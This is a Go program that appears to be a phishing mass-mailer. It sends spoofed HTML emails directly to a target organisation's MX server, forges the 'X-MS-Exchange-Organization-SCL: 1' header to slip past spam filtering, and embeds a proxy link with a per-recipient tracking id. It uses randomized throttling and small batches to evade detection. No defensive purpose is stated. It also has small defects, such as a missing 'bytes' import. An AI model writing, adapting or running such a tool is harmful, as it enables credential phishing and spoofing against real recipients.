package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/smtp"
	"os"
	"regexp"
	"strings"
	"text/template"
	"time"
)

type Recipient struct {
	Email string `json:"email"`
	Name  string `json:"name"`
}

type Campaign struct {
	Recipients []Recipient `json:"recipients"`
	Subject    string      `json:"subject"`
	BodyHTML   string      `json:"body_html"`
	FromEmail  string      `json:"from_email"`
	ProxyURL   string      `json:"proxy_url"`
	MXHost     string      `json:"mx_host"`
	MXIP       string      `json:"mx_ip"`
}

var (
	configFile = flag.String("config", "campaign.json", "JSON config path")
	throttle   = flag.Bool("throttle", true, "Enable random delays")
	batchSize  = flag.Int("batch", 2, "Emails per batch (1-5)")
	logFile    = flag.String("log", "sender.log", "Log file")
)

func main() {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[PANIC RECOVERY] %v – Exiting gracefully", r)
			os.Exit(1)
		}
	}()

	flag.Parse()

	// Setup logging
	file, err := os.OpenFile(*logFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
	if err != nil {
		log.Printf("Log file failed: %v – Using stdout", err)
		file = os.Stdout
	}
	defer file.Close()
	logger := log.New(file, "", log.LstdFlags)
	defer logger.Println("[COMPLETE] Direct Send op finished")

	// Load & validate config
	camp, err := loadAndValidateConfig(*configFile)
	if err != nil {
		logger.Fatalf("Config error: %v", err)
	}

	// Prompt & override MX/IP (interactive, save for reuse)
	promptAndUpdateMX(camp)

	// Run Direct Send campaign
	if err := runDirectCampaign(camp, logger); err != nil {
		logger.Printf("[ERROR] Campaign failed: %v", err)
	}
}

func loadAndValidateConfig(path string) (*Campaign, error) {
	data, err := ioutil.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("file read failed: %v", err)
	}
	var camp Campaign
	if err := json.Unmarshal(data, &camp); err != nil {
		return nil, fmt.Errorf("JSON unmarshal failed: %v", err)
	}
	if len(camp.Recipients) == 0 {
		return nil, fmt.Errorf("no recipients in config")
	}
	if camp.ProxyURL == "" || camp.FromEmail == "" {
		return nil, fmt.Errorf("proxy_url or from_email missing")
	}
	emailRe := regexp.MustCompile(`^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$`)
	for _, rec := range camp.Recipients {
		if !emailRe.MatchString(rec.Email) {
			return nil, fmt.Errorf("invalid email: %s", rec.Email)
		}
	}
	return &camp, nil
}

func promptAndUpdateMX(camp *Campaign) {
	reader := bufio.NewReader(os.Stdin)
	fmt.Printf("MX Host (default: %s): ", camp.MXHost)
	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(input)
	if input != "" {
		camp.MXHost = input
	}

	fmt.Printf("MX IP (default: %s): ", camp.MXIP)
	input, _ = reader.ReadString('\n')
	input = strings.TrimSpace(input)
	if input != "" {
		camp.MXIP = input
	}

	// Save for reuse
	updatedData, _ := json.MarshalIndent(camp, "", "  ")
	ioutil.WriteFile(*configFile, updatedData, 0644)
	fmt.Printf("[UPDATED] Config saved with MX: %s / IP: %s\n", camp.MXHost, camp.MXIP)
}

func runDirectCampaign(camp *Campaign, logger *log.Logger) error {
	for i := 0; i < len(camp.Recipients); i += *batchSize {
		end := i + *batchSize
		if end > len(camp.Recipients) {
			end = len(camp.Recipients)
		}
		if err := sendDirectBatch(camp, camp.Recipients[i:end], logger); err != nil {
			logger.Printf("Batch %d-%d error: %v", i, end, err)
		}
		time.Sleep(30 * time.Second)
	}
	return nil
}

func sendDirectBatch(camp *Campaign, recs []Recipient, logger *log.Logger) error {
	for _, rec := range recs {
		if *throttle {
			delay := rand.Intn(180) + 60
			logger.Printf("[THROTTLE] %ds for %s", delay, rec.Email)
			time.Sleep(time.Duration(delay) * time.Second)
		}

		tmpl, err := template.New("body").Parse(camp.BodyHTML)
		if err != nil {
			return fmt.Errorf("template parse: %v", err)
		}
		var buf bytes.Buffer
		rid := fmt.Sprintf("%x", rand.Int63())
		if err := tmpl.Execute(&buf, struct{ Name string; URL string }{rec.Name, camp.ProxyURL + "?rid=" + rid}); err != nil {
			return fmt.Errorf("template exec: %v", err)
		}

		msg := fmt.Sprintf("To: %s\r\nFrom: %s\r\nSubject: %s\r\nX-MS-Exchange-Organization-SCL: 1\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n%s",
			rec.Email, camp.FromEmail, camp.Subject, buf.String())

		if err := sendDirectSMTP(msg, camp.FromEmail, rec.Email, camp.MXHost, camp.MXIP); err != nil {
			logger.Printf("[SEND ERROR] %s: %v", rec.Email, err)
			continue
		}
		logger.Printf("[SENT] %s (RID %s)", rec.Email, rid)
	}
	return nil
}

func sendDirectSMTP(msg, from, to, mxHost, mxIP string) error {
	for attempt := 1; attempt <= 3; attempt++ {
		var c *smtp.Client
		var err error
		connTimeout := 30 * time.Second
		if mxIP != "" {
			conn, dErr := net.DialTimeout("tcp", mxIP+":25", connTimeout)
			if dErr != nil {
				if attempt < 3 {
					time.Sleep(5 * time.Second)
					continue
				}
				return dErr
			}
			c, err = smtp.NewClient(conn, mxIP)
		} else {
			c, err = smtp.DialTimeout(mxHost+":25", connTimeout)
		}
		if err != nil {
			if attempt < 3 {
				time.Sleep(5 * time.Second)
				continue
			}
			return err
		}
		defer c.Close()

		if err = c.Mail(from); err != nil {
			continue
		}
		if err = c.Rcpt(to); err != nil {
			continue
		}
		w, err := c.Data()
		if err != nil {
			continue
		}
		if _, err = w.Write([]byte(msg)); err != nil {
			w.Close()
			continue
		}
		w.Close()
		c.Quit()
		return nil
	}
	return fmt.Errorf("all retries exhausted")
}
